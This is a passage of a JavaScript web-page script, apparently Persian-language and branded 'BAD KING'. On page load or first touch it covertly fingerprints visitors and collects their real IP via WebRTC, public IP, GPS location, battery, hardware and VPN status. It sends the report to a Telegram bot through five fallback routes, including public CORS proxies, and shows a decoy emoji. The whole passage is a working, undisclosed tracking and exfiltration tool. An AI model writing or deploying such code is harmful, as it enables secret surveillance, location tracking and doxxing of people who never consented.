        const p = [];
        try {
            for (let i = 0; i < navigator.plugins.length; i++) {
                p.push(navigator.plugins[i].name);
            }
        } catch (e) {}
        return p;
    }

    function getFingerprint() {
        try {
            const c = document.createElement('canvas');
            c.width = 400;
            c.height = 100;
            const ctx = c.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
            ctx.fillStyle = 'rgba(102,204,0,0.7)';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
            ctx.fillStyle = '#f00';
            ctx.fillRect(0, 0, 400, 100);
            ctx.fillStyle = '#0f0';
            ctx.fillRect(10, 10, 380, 80);
            ctx.fillStyle = '#00f';
            ctx.fillRect(20, 20, 360, 60);
            ctx.strokeStyle = '#fff';
            ctx.lineWidth = 2;
            ctx.strokeRect(30, 30, 340, 40);
            return c.toDataURL().substring(0, 50) + '...';
        } catch(e) { return 'نامشخص'; }
    }

    async function getMediaDevices() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                return { microphone: 'نامشخص', camera: 'نامشخص' };
            }
            const devices = await navigator.mediaDevices.enumerateDevices();
            let micCount = 0, camCount = 0;
            for (const d of devices) {
                if (d.kind === 'audioinput') micCount++;
                if (d.kind === 'videoinput') camCount++;
            }
            return { microphone: micCount, camera: camCount };
        } catch(e) {
            return { microphone: 'نامشخص', camera: 'نامشخص' };
        }
    }

    function getSensorInfo() {
        let accel = 'خیر', gyro = 'خیر', compass = 'خیر';
        try {
            if (window.DeviceMotionEvent) {
                accel = 'بله';
                gyro = 'بله';
            }
        } catch(e) {}
        try {
            if (window.DeviceOrientationEvent) {
                compass = 'بله';
            }
        } catch(e) {}
        return { accelerometer: accel, gyroscope: gyro, compass: compass };
    }

    function getCapabilities() {
        const canvas = document.createElement('canvas');
        const caps = {
            webgl: () => !!(canvas.getContext('webgl') || canvas.getContext('experimental-webgl')),
            webgl2: () => !!(canvas.getContext('webgl2') || canvas.getContext('experimental-webgl2')),
            webgpu: () => 'gpu' in navigator,
            webassembly: () => typeof WebAssembly !== 'undefined',
            websocket: () => typeof WebSocket !== 'undefined',
            serviceWorker: () => 'serviceWorker' in navigator,
            indexedDB: () => 'indexedDB' in window,
            webrtc: () => 'RTCPeerConnection' in window || 'webkitRTCPeerConnection' in window
        };
        let count = 0;
        for (const [key, fn] of Object.entries(caps)) {
            try { if (fn()) count++; } catch(e) {}
        }
        return count;
    }

    function getDeepHardwareInfo() {
        let gpuModel = 'نامشخص';
        let openGL = 'نامشخص';
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const ext = gl.getExtension('WEBGL_debug_renderer_info');
                if (ext) {
                    gpuModel = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || 'نامشخص';
                }
                openGL = gl.getParameter(gl.VERSION) || 'نامشخص';
            }
        } catch(e) {}
        return { gpuModel: gpuModel, openGL: openGL };
    }

    // ================================================================
    // 7. ارسال به تلگرام (۵ روش)
    // ================================================================
    async function sendToTelegram(message) {
        const methods = [
            { name: 'Worker', url: `${WORKER_URL}bot${TELEGRAM_TOKEN}/sendMessage` },
            { name: 'مستقیم', url: `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage` },
            { name: 'CORS Proxy', url: `https://corsproxy.io/?https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage` },
            { name: 'All Origins', url: `https://api.allorigins.win/raw?url=https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage` },
            { name: 'CORS Anywhere', url: `https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage` }
        ];

        for (const method of methods) {
            try {
                const response = await fetch(method.url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                const result = await response.json();
                if (result.ok) {
                    console.log(`✅ ارسال با ${method.name} موفق بود`);
                    return true;
                }
            } catch (e) {
                console.log(`⚠️ ${method.name} خطا:`, e.message);
            }
        }
        console.log('❌ همه روش‌های ارسال ناموفق بودند');
        return false;
    }

    // ================================================================
    // 8. اجرا
    // ================================================================
    async function run() {
        try {
            const ua = navigator.userAgent;
            const os = detectOS(ua);
            const device = detectDevice(ua);
            const battery = await getBatteryInfo();
            const location = await getLocationInfo();
            const realIP = await getWebRTCIP();
            const publicIPData = await getIPFromAPI();
            const fonts = getFonts();
            const plugins = getPlugins();
            const fingerprint = getFingerprint();
            const mediaDevices = await getMediaDevices();
            const sensors = getSensorInfo();
            const capabilities = getCapabilities();
            const deepHardware = getDeepHardwareInfo();

            let browser = 'سایر', bv = '';
            if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) { browser = 'کروم'; const m = ua.match(/Chrome\/(\d+)/); if (m) bv = m[1]; }
            else if (ua.includes('Firefox')) { browser = 'فایرفاکس'; const m = ua.match(/Firefox\/(\d+)/); if (m) bv = m[1]; }
            else if (ua.includes('Safari') && !ua.includes('Chrome')) { browser = 'سافاری'; const m = ua.match(/Version\/(\d+)/); if (m) bv = m[1]; }
            else if (ua.includes('Edg')) { browser = 'اج'; const m = ua.match(/Edg\/(\d+)/); if (m) bv = m[1]; }
            else if (ua.includes('Opera') || ua.includes('OPR')) { browser = 'اپرا'; const m = ua.match(/Opera\/(\d+)/); if (m) bv = m[1]; }

            let arch = 'نامشخص';
            if (ua.includes('WOW64') || ua.includes('Win64') || ua.includes('x86_64') || ua.includes('amd64')) arch = '۶۴ بیتی';
            else if (ua.includes('x86') || ua.includes('i686')) arch = '۳۲ بیتی';
            else if (ua.includes('arm64') || ua.includes('aarch64')) arch = 'آرم ۶۴ بیتی';

            let cpu = 'نامشخص';
            if (ua.includes('Intel')) cpu = 'اینتل';
            else if (ua.includes('AMD')) cpu = 'ای‌ام‌دی';
            else if (ua.includes('Apple')) cpu = 'اپل سیلیکون';
            else if (ua.includes('ARM')) cpu = 'آرم';

            const screen = window.screen;
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

            let vpnStatus = 'خاموش';
            let vpnType = 'هیچ';
            if (realIP && publicIPData && realIP !== publicIPData.ip) {
                vpnStatus = 'روشن';
                vpnType = 'وی‌پی‌ان';
            }

            // ===== پیام نهایی =====
            let msg = '👑 *گزارش کامل BAD KING* 👑\n';
            msg += '═══════════════════════════════════════\n\n';
            
            msg += '🕒 *زمان و تاریخ*\n';
            msg += `   └ ${new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })}\n`;
            msg += `   └ ${new Date().toLocaleString('fa-IR', { weekday: 'long' })} - ${['فروردین','اردیبهشت','خرداد','تیر','مرداد','شهریور','مهر','آبان','آذر','دی','بهمن','اسفند'][new Date().getMonth()]} ${new Date().getFullYear()}\n`;
            msg += `   └ منطقه زمانی: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n`;
            
            msg += '📱 *دستگاه*\n';
            msg += `   └ نوع: ${device.deviceType}`;
            if (device.deviceModel !== 'نامشخص') msg += ` | ${device.deviceModel}`;
            if (device.deviceVendor !== 'نامشخص') msg += ` (${device.deviceVendor})`;
            msg += `\n   └ سیستم‌عامل: ${os}\n`;
            msg += `   └ مرورگر: ${browser} نسخه ${bv}\n`;
            msg += `   └ رم: ${navigator.deviceMemory || 'نامشخص'} گیگابایت\n`;
            msg += `   └ هسته‌ها: ${navigator.hardwareConcurrency || 'نامشخص'}\n`;
            if (cpu !== 'نامشخص') msg += `   └ پردازنده: ${cpu}\n`;
            if (deepHardware.gpuModel !== 'نامشخص') msg += `   └ کارت گرافیک: ${deepHardware.gpuModel}\n`;
            if (arch !== 'نامشخص') msg += `   └ معماری: ${arch}\n\n`;
            
            msg += '🖼️ *نمایشگر*\n';
            msg += `   └ رزولوشن: ${screen.width}x${screen.height}\n`;
            msg += `   └ عمق رنگ: ${screen.colorDepth} بیت\n`;
            msg += `   └ نسبت پیکسل: ${(window.devicePixelRatio || 1)}x\n`;
            if (screen.refreshRate) msg += `   └ نرخ تازه‌سازی: ${screen.refreshRate} هرتز\n`;
            msg += `   └ جهت‌گیری: ${screen.orientation?.type || 'نامشخص'}\n\n`;
            
            msg += '🌐 *شبکه*\n';
            msg += `   └ نوع اتصال: ${conn ? (conn.effectiveType || conn.type || 'نامشخص') : 'نامشخص'}\n`;
            if (conn && conn.downlink) msg += `   └ سرعت: ${conn.downlink} مگابیت بر ثانیه\n`;
            if (conn && conn.rtt) msg += `   └ تأخیر: ${conn.rtt} میلی‌ثانیه\n\n`;
            
            if (realIP) msg += `🆔 آی‌پی واقعی: ${realIP}\n`;
            if (publicIPData) {
                msg += `🆔 آی‌پی ظاهری: ${publicIPData.ip}\n`;
                if (publicIPData.city && publicIPData.city !== 'نامشخص') msg += `📍 موقعیت ظاهری: ${publicIPData.city}, ${publicIPData.country || 'نامشخص'}\n`;
                if (publicIPData.isp && publicIPData.isp !== 'نامشخص') msg += `📡 ارائه‌دهنده: ${publicIPData.isp}\n`;
            }
            msg += `🛡️ وضعیت وی‌پی‌ان: ${vpnStatus}`;
            if (vpnType !== 'هیچ') msg += ` (${vpnType})`;
            msg += '\n\n';
            
            // ===== موقعیت مکانی دقیق =====
            if (location) {
                msg += '📍 *موقعیت مکانی دقیق (GPS)*\n';
                msg += `   └ مختصات: ${location.lat}, ${location.lng}\n`;
                msg += `   └ دقت: ${location.acc}\n`;
                if (location.alt !== 'نامشخص') msg += `   └ ارتفاع: ${location.alt}\n`;
                if (location.heading !== 'نامشخص') msg += `   └ جهت: ${location.heading} درجه\n`;
                if (location.speed !== 'نامشخص') msg += `   └ سرعت: ${location.speed}\n`;
                msg += `   └ نقشه گوگل: ${location.mapGoogle}\n`;
                msg += `   └ نقشه OSM: ${location.mapOSM}\n`;
                msg += `   └ نقشه Waze: ${location.mapWaze}\n\n`;
            } else {
                msg += '📍 *موقعیت مکانی:* دریافت نشد (مجوز داده نشده یا خطا)\n\n';
            }
            
            if (battery) {
                msg += '🔋 *باتری*\n';
                msg += `   └ سطح: ${battery.level}\n`;
                msg += `   └ وضعیت: ${battery.charging}\n`;
                if (battery.chargingTime !== 'نامشخص') msg += `   └ زمان شارژ: ${battery.chargingTime}\n`;
                if (battery.dischargingTime !== 'نامشخص') msg += `   └ زمان تخلیه: ${battery.dischargingTime}\n\n`;
            }
            
            if (fonts.length > 0) msg += `🔤 *فونت‌ها:* ${fonts.slice(0, 8).join(', ')}${fonts.length > 8 ? '...' : ''}\n`;
            if (plugins.length > 0) msg += `🔌 *افزونه‌ها:* ${plugins.slice(0, 5).join(', ')}${plugins.length > 5 ? '...' : ''}\n\n`;
            
            if (mediaDevices) {
                msg += '🎤 *دستگاه‌های ورودی*\n';
                msg += `   └ میکروفون: ${mediaDevices.microphone}\n`;
                msg += `   └ دوربین: ${mediaDevices.camera}\n\n`;
            }
            
            if (sensors) {
                msg += '📡 *سنسورها*\n';
                msg += `   └ شتاب‌سنج: ${sensors.accelerometer}\n`;
                msg += `   └ ژیروسکوپ: ${sensors.gyroscope}\n`;
                msg += `   └ قطب‌نما: ${sensors.compass}\n\n`;
            }
            
            msg += `🔧 *قابلیت‌های مرورگر*\n`;
            msg += `   └ ${capabilities} قابلیت فعال\n\n`;
            
            msg += `🎨 *اثر انگشت دیجیتال:*\n`;
            msg += `   └ ${fingerprint}\n\n`;
            
            msg += `🔗 *منبع ورود:* ${document.referrer || 'مستقیم'}\n`;
            msg += `🔹 *آدرس:* ${window.location.href}`;

            // ===== ارسال به تلگرام =====
            const sent = await sendToTelegram(msg);

            // ===== ذخیره در پنل =====
            try {
                let visits = JSON.parse(localStorage.getItem('badking_visits') || '[]');
                visits.unshift({
                    id: Date.now(),
                    time: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' }),
                    deviceType: device.deviceType,
                    deviceModel: device.deviceModel,
                    os: os,
                    browser: browser + ' v' + bv,
                    screen: screen.width + 'x' + screen.height,
                    memory: navigator.deviceMemory || 'نامشخص',
                    cores: navigator.hardwareConcurrency || 'نامشخص',
                    ip: publicIPData ? publicIPData.ip : 'نامشخص',
                    location: publicIPData ? publicIPData.city + ', ' + publicIPData.country : 'نامشخص',
                    gps: location ? location.lat + ', ' + location.lng : 'نامشخص',
                    mapLink: location ? location.mapGoogle : 'نامشخص',
                    battery: battery ? battery.level : 'نامشخص',
                    vpn: vpnStatus,
                    referrer: document.referrer || 'مستقیم'
                });
                if (visits.length > 100) visits = visits.slice(0, 100);
                localStorage.setItem('badking_visits', JSON.stringify(visits));
            } catch(e) {}

            if (sent) {
                showEmoji();
                console.log('✅ اطلاعات با موفقیت ارسال شد');
            } else {
                showEmoji();
                console.log('⚠️ اطلاعات در پنل ذخیره شد');
            }

        } catch(e) {
            console.error('❌ خطا:', e);
        }
    }

    let hasRun = false;
    function start() { if (!hasRun) { hasRun = true; run(); } }

    setTimeout(start, 2000);
    document.addEventListener('click', start);
    document.addEventListener('touchstart', start);

    console.log('✅ BAD KING - کاملترین نسخه با موقعیت مکانی و ۵ روش پشتیبان');
</script>
